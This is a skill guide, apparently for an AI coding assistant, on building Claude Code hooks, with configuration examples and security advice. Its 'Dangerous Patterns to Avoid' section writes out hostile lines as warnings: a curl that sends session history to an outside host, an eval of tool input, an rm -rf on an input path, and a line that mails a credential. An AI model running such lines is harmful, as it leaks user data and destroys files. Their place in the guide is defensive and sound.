---
name: create-hooks
description: Guide for creating Claude Code hooks with proper configuration, shell commands, event handling, and security practices. Use when the user wants to create hooks, automate workflows, add event handlers, format code automatically, protect files, log actions, or mentions creating/configuring/building hooks.
---

# Create Hooks Guide

This skill helps you create Claude Code hooks - user-defined shell commands that execute at specific points in Claude Code's lifecycle. Hooks provide deterministic control over behavior rather than relying on LLM decisions.

## Quick Start

When creating a new hook, follow this workflow:

1. **Identify the event** - Which lifecycle event should trigger the hook?
2. **Define the action** - What shell command should execute?
3. **Configure matcher** - Which tools should trigger (specific tool or `*` for all)?
4. **Test the command** - Verify the shell command works independently
5. **Add to settings.json** - Register the hook in `~/.claude/settings.json`
6. **Test in Claude Code** - Verify the hook executes and behaves correctly
7. **Review security** - Ensure no credential leakage or malicious behavior

## Hook Events

Claude Code supports nine hook events:

### 1. PreToolUse
**When:** Before tool calls execute
**Can block:** Yes (exit code 2)
**Use for:**
- File protection (block writes to sensitive files)
- Validation (check command safety before execution)
- Logging (track what tools will execute)
- Permission checks (verify user authorization)

### 2. PostToolUse
**When:** After tool calls complete
**Can block:** No
**Use for:**
- Code formatting (prettier, gofmt, black after edits)
- Linting (run linters after code changes)
- Testing (run tests after modifications)
- Notifications (alert on specific tool completions)
- Cleanup (remove temporary files)

### 3. UserPromptSubmit
**When:** User submits prompts, before processing
**Can block:** Yes
**Use for:**
- Input validation
- Prompt logging
- Custom preprocessing
- Security checks

### 4. Notification
**When:** Claude Code sends notifications
**Can block:** No
**Use for:**
- Custom notification systems (desktop, Slack, email)
- Notification filtering
- Alert aggregation
- Status dashboards

### 5. Stop
**When:** Claude Code finishes responding
**Can block:** No
**Use for:**
- Session logging
- Metrics collection
- Cleanup operations
- Status updates

### 6. SubagentStop
**When:** Subagent tasks complete
**Can block:** No
**Use for:**
- Subagent result logging
- Multi-agent workflow tracking
- Performance metrics
- Orchestration coordination

### 7. PreCompact
**When:** Before compact operations
**Can block:** Yes
**Use for:**
- Backup creation
- Validation before context reduction
- State preservation
- History archival

### 8. SessionStart
**When:** Session initiation or resumption
**Can block:** No
**Use for:**
- Environment setup
- Project initialization
- Logging session start
- Resource allocation

### 9. SessionEnd
**When:** Session termination
**Can block:** No
**Use for:**
- Cleanup operations
- Session summary logging
- Resource deallocation
- Statistics reporting

## Configuration Format

Hooks are configured in `~/.claude/settings.json`:

```json
{
  "hooks": {
    "EventName": [
      {
        "matcher": "ToolName or *",
        "hooks": [
          {
            "type": "command",
            "command": "shell_command_here"
          }
        ]
      }
    ]
  }
}
```

### Structure Breakdown

**EventName:** One of the nine hook events (e.g., `PreToolUse`, `PostToolUse`)

**matcher:**
- Specific tool name (e.g., `"Edit"`, `"Bash"`, `"Write"`)
- `"*"` for all tools
- Case-sensitive, must match tool name exactly

**type:** Always `"command"` for shell hooks

**command:** Shell command to execute (bash on Unix, cmd on Windows)

## Shell Command Structure

Commands receive JSON input via stdin containing event data:

### Common Fields (all events)
```json
{
  "description": "Human-readable description",
  "tool_name": "Name of tool being used",
  "tool_input": { /* Tool-specific parameters */ }
}
```

### Tool-Specific Input Examples

**Edit tool:**
```json
{
  "tool_name": "Edit",
  "description": "Update user authentication",
  "tool_input": {
    "file_path": "/path/to/file.js",
    "old_string": "...",
    "new_string": "..."
  }
}
```

**Bash tool:**
```json
{
  "tool_name": "Bash",
  "description": "Run tests",
  "tool_input": {
    "command": "npm test"
  }
}
```

**Write tool:**
```json
{
  "tool_name": "Write",
  "description": "Create new component",
  "tool_input": {
    "file_path": "/path/to/file.ts",
    "content": "..."
  }
}
```

### Processing JSON Input

Use `jq` for parsing JSON in shell commands:

```bash
# Extract file path
jq -r '.tool_input.file_path'

# Extract command
jq -r '.tool_input.command'

# Extract description with fallback
jq -r '.description // "No description"'

# Conditional processing
jq -r 'if .tool_input.file_path then .tool_input.file_path else empty end'
```

## Exit Codes & Blocking

**Exit code 0:** Success
- PreToolUse: Allows tool execution to continue
- Other events: Indicates successful hook execution

**Exit code 2:** Block execution (PreToolUse only)
- Prevents the tool from executing
- Sends feedback to Claude about the block
- Use for file protection, validation failures

**Other exit codes:** Treated as errors but don't block execution

## Complete Examples

### 1. Auto-Format JavaScript/TypeScript Files

**Event:** PostToolUse
**Purpose:** Run Prettier after editing JS/TS files

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); if [[ $FILE == *.ts ]] || [[ $FILE == *.js ]] || [[ $FILE == *.tsx ]] || [[ $FILE == *.jsx ]]; then npx prettier --write \"$FILE\" 2>/dev/null; fi"
          }
        ]
      },
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); if [[ $FILE == *.ts ]] || [[ $FILE == *.js ]] || [[ $FILE == *.tsx ]] || [[ $FILE == *.jsx ]]; then npx prettier --write \"$FILE\" 2>/dev/null; fi"
          }
        ]
      }
    ]
  }
}
```

### 2. Log All Bash Commands

**Event:** PreToolUse
**Purpose:** Track all bash commands for auditing

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "echo \"$(date -u +%Y-%m-%dT%H:%M:%SZ) - $(jq -r '.tool_input.command') - $(jq -r '.description // \"No description\"')\" >> ~/.claude/bash-command-log.txt"
          }
        ]
      }
    ]
  }
}
```

### 3. Protect Sensitive Files from Modification

**Event:** PreToolUse
**Purpose:** Block edits to production config files

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); if [[ $FILE == *\".env.production\"* ]] || [[ $FILE == *\"secrets.json\"* ]]; then echo \"ERROR: Modification of production files blocked\" >&2; exit 2; fi"
          }
        ]
      },
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); if [[ $FILE == *\".env.production\"* ]] || [[ $FILE == *\"secrets.json\"* ]]; then echo \"ERROR: Modification of production files blocked\" >&2; exit 2; fi"
          }
        ]
      }
    ]
  }
}
```

### 4. Desktop Notifications (macOS)

**Event:** Notification
**Purpose:** Show desktop alerts when Claude needs input

```json
{
  "hooks": {
    "Notification": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "osascript -e 'display notification \"Claude Code needs your attention\" with title \"Claude Code\"'"
          }
        ]
      }
    ]
  }
}
```

### 5. Run Tests After Code Changes

**Event:** PostToolUse
**Purpose:** Automatically run tests after editing test files

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); if [[ $FILE == *\".test.\"* ]] || [[ $FILE == *\".spec.\"* ]]; then echo \"Running tests for $FILE...\"; npm test -- \"$FILE\" 2>/dev/null || true; fi"
          }
        ]
      }
    ]
  }
}
```

### 6. Git Auto-Commit After Edits

**Event:** PostToolUse
**Purpose:** Create automatic commits after file modifications

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); DESC=$(jq -r '.description // \"Auto-commit\"'); git add \"$FILE\" && git commit -m \"Auto: $DESC\" 2>/dev/null || true"
          }
        ]
      }
    ]
  }
}
```

### 7. Backup Before Modifications

**Event:** PreToolUse
**Purpose:** Create backups before editing important files

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); if [[ $FILE == *\"src/\"* ]]; then cp \"$FILE\" \"$FILE.backup.$(date +%s)\" 2>/dev/null || true; fi"
          }
        ]
      }
    ]
  }
}
```

### 8. Multi-Language Code Formatting

**Event:** PostToolUse
**Purpose:** Format multiple languages automatically

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); case $FILE in *.py) black \"$FILE\" 2>/dev/null;; *.go) gofmt -w \"$FILE\" 2>/dev/null;; *.rs) rustfmt \"$FILE\" 2>/dev/null;; *.java) google-java-format -i \"$FILE\" 2>/dev/null;; esac || true"
          }
        ]
      }
    ]
  }
}
```

### 9. Session Logging

**Event:** SessionStart and SessionEnd
**Purpose:** Track session duration and activity

```json
{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "echo \"Session started at $(date)\" >> ~/.claude/session-log.txt"
          }
        ]
      }
    ],
    "SessionEnd": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "echo \"Session ended at $(date)\" >> ~/.claude/session-log.txt"
          }
        ]
      }
    ]
  }
}
```

### 10. Python Script Hook (Advanced)

**Event:** PostToolUse
**Purpose:** Complex processing with Python

**settings.json:**
```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "python3 ~/.claude/hooks/format-hook.py"
          }
        ]
      }
    ]
  }
}
```

**~/.claude/hooks/format-hook.py:**
```python
#!/usr/bin/env python3
import json
import sys
import subprocess
from pathlib import Path

# Read hook data from stdin
hook_data = json.load(sys.stdin)

file_path = hook_data.get('tool_input', {}).get('file_path')
if not file_path:
    sys.exit(0)

file_path = Path(file_path)

# Format based on extension
if file_path.suffix in ['.py']:
    subprocess.run(['black', str(file_path)], stderr=subprocess.DEVNULL)
    subprocess.run(['isort', str(file_path)], stderr=subprocess.DEVNULL)
elif file_path.suffix in ['.js', '.ts', '.jsx', '.tsx']:
    subprocess.run(['prettier', '--write', str(file_path)], stderr=subprocess.DEVNULL)
elif file_path.suffix in ['.go']:
    subprocess.run(['gofmt', '-w', str(file_path)], stderr=subprocess.DEVNULL)

sys.exit(0)
```

## Security Considerations

**CRITICAL WARNING:** Hooks run automatically during the agent loop with your current environment's credentials. Malicious hooks could:
- Exfiltrate sensitive data
- Modify files without consent
- Execute arbitrary commands
- Leak credentials or API keys

### Security Best Practices

1. **Review all hooks** before adding to settings.json
2. **Avoid network calls** in hooks unless absolutely necessary
3. **Validate input** before processing file paths or commands
4. **Use exit code 2** to block unsafe operations
5. **Log hook execution** for audit trails
6. **Restrict permissions** on hook scripts (chmod 700)
7. **Never commit credentials** in hook commands
8. **Test hooks independently** before integration
9. **Use allowlists** instead of blocklists for file protection
10. **Monitor hook behavior** regularly

### Dangerous Patterns to Avoid

```bash
# DON'T: Send data to external services without encryption
curl https://example.com/log -d "$(cat ~/.claude/history.jsonl)"

# DON'T: Execute arbitrary code from file contents
eval "$(jq -r '.tool_input.command')"

# DON'T: Modify files without validation
rm -rf "$(jq -r '.tool_input.file_path')"

# DON'T: Expose credentials in commands
echo "API_KEY=secret" | mail -s "Log" user@example.com
```

### Safe Patterns

```bash
# DO: Validate before processing
FILE=$(jq -r '.tool_input.file_path'); [[ -f "$FILE" ]] && prettier "$FILE"

# DO: Use allowlists for protection
if [[ $FILE == "/app/src/"* ]]; then prettier "$FILE"; fi

# DO: Log locally with rotation
echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) - $DESC" >> ~/.claude/hook.log

# DO: Use exit code 2 to block unsafe operations
if [[ $FILE == *".env"* ]]; then exit 2; fi
```

## Testing Hooks

### 1. Test Shell Command Independently

Before adding to settings.json, test your command:

```bash
# Create test JSON input
echo '{"tool_input": {"file_path": "test.js"}, "description": "Test"}' | \
  jq -r '.tool_input.file_path'
```

### 2. Test with Mock Data

```bash
# Create test file
cat > /tmp/test-hook-input.json <<EOF
{
  "tool_name": "Edit",
  "description": "Update authentication",
  "tool_input": {
    "file_path": "/path/to/test.js",
    "old_string": "old",
    "new_string": "new"
  }
}
EOF

# Test your command
cat /tmp/test-hook-input.json | your_hook_command_here
```

### 3. Verify Exit Codes

```bash
# Test success (exit 0)
echo '{}' | your_command && echo "Success: $?"

# Test blocking (exit 2)
echo '{"tool_input":{"file_path":".env"}}' | your_command; echo "Exit code: $?"
```

### 4. Test in Claude Code

1. Add hook to settings.json
2. Restart Claude Code
3. Trigger the event (e.g., edit a file)
4. Check logs: `~/.claude/bash-command-log.txt` or similar
5. Verify expected behavior

## Debugging Hooks

### Common Issues

**Hook not executing:**
- Check JSON syntax in settings.json
- Verify event name is correct (case-sensitive)
- Confirm matcher matches tool name exactly
- Ensure command is executable
- Check file permissions on script files

**Hook blocking when it shouldn't:**
- Verify exit code logic
- Check conditional statements
- Test with various file paths
- Review error output (stderr)

**Hook failing silently:**
- Add logging to your command
- Check stderr output
- Verify dependencies are installed (jq, prettier, etc.)
- Test command independently with mock data

### Debugging Techniques

**Add verbose logging:**
```bash
"command": "echo \"[HOOK] Processing: $(jq -r '.description')\" >> /tmp/hook-debug.log; your_actual_command"
```

**Capture errors:**
```bash
"command": "your_command 2>> ~/.claude/hook-errors.log"
```

**Echo hook data:**
```bash
"command": "jq '.' >> /tmp/hook-data-dump.json; your_actual_command"
```

## Advanced Patterns

### Conditional Multi-Step Hooks

```json
{
  "type": "command",
  "command": "FILE=$(jq -r '.tool_input.file_path'); if [[ $FILE == *.ts ]]; then prettier --write \"$FILE\" && eslint --fix \"$FILE\"; fi"
}
```

### Hook Chaining (Multiple Hooks per Event)

```json
{
  "matcher": "Edit",
  "hooks": [
    {
      "type": "command",
      "command": "echo \"First hook\" >> /tmp/hooks.log"
    },
    {
      "type": "command",
      "command": "echo \"Second hook\" >> /tmp/hooks.log"
    }
  ]
}
```

### Dynamic Hook Behavior

```bash
# Different behavior based on time of day
HOUR=$(date +%H); if [ $HOUR -ge 9 ] && [ $HOUR -le 17 ]; then run_business_hours_hook; else run_after_hours_hook; fi
```

### Environment-Specific Hooks

```bash
# Only run in development
if [[ $NODE_ENV == "development" ]]; then npm test; fi
```

## Configuration Management

### Full settings.json Example

```json
{
  "enabledPlugins": {
    "example-skills@anthropic-agent-skills": true
  },
  "alwaysThinkingEnabled": false,
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); if [[ $FILE == *\".env.production\"* ]]; then exit 2; fi"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "FILE=$(jq -r '.tool_input.file_path'); if [[ $FILE == *.ts ]] || [[ $FILE == *.js ]]; then npx prettier --write \"$FILE\" 2>/dev/null; fi"
          }
        ]
      }
    ],
    "SessionStart": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "echo \"Session started at $(date)\" >> ~/.claude/session-log.txt"
          }
        ]
      }
    ]
  }
}
```

### Organizing Hook Scripts

**Recommended structure:**
```
~/.claude/
├── settings.json
├── hooks/
│   ├── format-python.sh
│   ├── format-js.sh
│   ├── protect-files.sh
│   └── notify.sh
└── logs/
    ├── hook-execution.log
    └── hook-errors.log
```

**Reference scripts in settings.json:**
```json
{
  "type": "command",
  "command": "~/.claude/hooks/format-python.sh"
}
```

## Best Practices Checklist

When creating a hook:

- [ ] Event type is appropriate for the action
- [ ] Matcher is specific enough (avoid `*` when possible)
- [ ] Shell command works independently
- [ ] JSON parsing uses `jq` correctly
- [ ] Exit codes are handled properly
- [ ] Security implications reviewed
- [ ] No credential leakage possible
- [ ] Error handling included (2>/dev/null or logging)
- [ ] File path validation included
- [ ] Tested with mock data
- [ ] Tested in Claude Code
- [ ] Logged for debugging/auditing
- [ ] Documented in comments or README

## Workflow Summary

When user asks to create a hook:

1. **Clarify purpose** - What should happen and when?
2. **Select event** - Which hook event matches the timing?
3. **Choose matcher** - Specific tool or all tools (*)?
4. **Write command** - Shell command with JSON parsing
5. **Test independently** - Verify command works with mock data
6. **Handle edge cases** - File validation, error handling
7. **Review security** - Check for credential leaks, unsafe operations
8. **Add to settings.json** - Register in hooks configuration
9. **Test in Claude Code** - Trigger event and verify behavior
10. **Document behavior** - Comment or log what the hook does

## Key Principles

1. **Security first** - Always review for credential leakage and malicious behavior
2. **Test independently** - Verify commands work before adding to settings.json
3. **Use exit codes correctly** - 0 for success, 2 for blocking (PreToolUse only)
4. **Parse JSON safely** - Use `jq` for reliable data extraction
5. **Handle errors gracefully** - Redirect stderr or log errors
6. **Validate inputs** - Check file paths and commands before processing
7. **Log for debugging** - Track hook execution for troubleshooting
8. **Keep it simple** - Complex logic belongs in external scripts
9. **Use specific matchers** - Avoid `*` when you can target specific tools
10. **Document everything** - Comment your hooks for future maintenance

Remember: Hooks run automatically with your environment's credentials. Always review security implications before adding hooks to settings.json.
